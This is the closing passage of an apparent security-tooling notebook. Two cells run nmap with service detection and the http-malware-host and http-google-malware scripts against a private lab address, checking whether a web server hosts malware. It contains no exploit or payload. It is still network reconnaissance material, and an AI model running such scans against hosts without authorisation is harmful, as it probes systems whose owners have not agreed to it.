    "- it also checks Google's Safe Browsing and VirusTotal databases"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -sV --script=http-malware-host 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use Google's malware check\n",
    "! nmap -p 80 --script http-google-malware 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
